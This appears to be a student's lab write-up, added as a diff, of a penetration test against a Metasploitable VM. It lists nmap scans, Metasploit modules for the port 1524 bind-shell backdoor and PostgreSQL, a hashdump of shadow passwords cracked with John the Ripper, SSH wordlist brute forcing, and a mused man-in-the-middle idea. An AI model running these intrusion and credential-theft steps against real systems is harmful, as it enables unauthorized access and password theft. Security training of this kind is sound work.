@@ -1,0 +1,57 @@
+Commands:--
+1) db_nmap -sV <target_IP_Adr>
+2) nmap -sT <target_IP-Adr>
+Here I decided I would use Nessus and found several critical weaknesses I have included
+a photo of the report with this submission
+
+Bind Shell Backdoor Detection:--
+1) search exploit ftp backdor
+2) use 1
+3)
+	set RHOST 192.168.56.107
+	set PORT 1524
+	exploit
+	background
+4) use post/linux/gather/hashdump
+5) set SESSION 1
+6) run
+	At this point I found a hasdump of the shadow file containing passwords of the metasploitable system
+	Now on my own Kali system I use John the ripper to unencrypt the hash
+
+7) john /root/.msf4/loot/20220313155238_default_192.168.56.107_linux.hashes_612050.txt -show
+	The results are stored in /loot/John the Ripper.png
+
+8) search linux shell post
+	found a network configuration dump
+
+9) use 20
+	This one is pretty exciting becuase I found various files and their locations such as routing table,
+ 	host file, Firewall configurations SSH keys etc. From previous hashdump, I also know the admin password
+	by modifying the host file and enough time I could create a man in the middle attack and steal more
+	sensitive data. back
+	Saved screenshot of this in loot/NetworkConfiguration.png
+
+OpenSSH 4.7
+1) search scanner ssh
+2) 
+	set STOP_ON_SUCCESS true
+	set RHOST 192.168.56.107
+	set USERPASS_FILE <the path to the metasploit wordlists>
+	run
+3) As the password was discovered from the hasdump, from here root access was easy
+
+Postgresql
+1) seach exploit postgresql
+2) use 4
+3) set the options
+4) run
+	Here I had a meterpreter sessions up and running however none of the meterpreter commands worked, the system was saying
+	that the command wasn't supported by the meterpreter version on the system. I'm not sure if that meant my target system or
+	my local system, or even how to resolve this issue
+
+Throughout the assignment I had to lookback at CVE reports constantly to see if something could be exploited, however
+they didn't really tell me how I could exploit them. I may have spent too much time on each vulnerability, rather than
+moving onto the next one. Reaslistically, the severe majority of my attempts had failed, with only the above documented
+attempts getting me anywhere. 
+
+
